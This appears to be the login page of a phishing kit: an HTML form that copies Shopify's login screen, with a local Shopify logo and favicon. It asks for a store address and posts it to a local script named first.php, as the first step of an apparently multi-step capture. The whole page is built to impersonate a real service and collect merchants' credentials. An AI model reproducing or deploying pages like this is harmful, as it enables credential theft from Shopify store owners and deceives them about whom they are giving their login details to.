<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="img/shopify-favicon.png">
    <title>Shopify - Login</title>
  </head>
  <body>
    <div class="container-fluid d-flex justify-content-center" style="height:80vh">
        <div class="row align-items-center">
            <div class="col align-self-center">

               
                <div class="logo">
                    <a href=""> <img src="img/spf.svg" alt="" width="117" height="34"> </a>
                </div>
           
                <h2 class="heading">Log in</h2>
                <h3 class="sub-heading">Continue to your store</h3>
                <form id="regForm" action="first.php" method="post">
                        
                        <!-- One "tab" for each step in the form: -->
                        <div class=""><p class="para" >Store address</p>
                          <p><input placeholder="myshop.shopify.com" class="form-control form-c " type="text" name="username"></p>
                        </div>
                        
    
                        
                        <div style="overflow:auto;">
                          <div style="float:left;">

                          <button type="submit" class="btn btn-primary billing-button">NEXT</button>
                          </div>
                        </div>
                        
                
                        </form>      
                        
                        <p class="sub-heading">New to Shopify? <a href="">Get started</a></p>
    

            </div>
        </div>

        
    </div>
  

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="js/formjs.js"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>
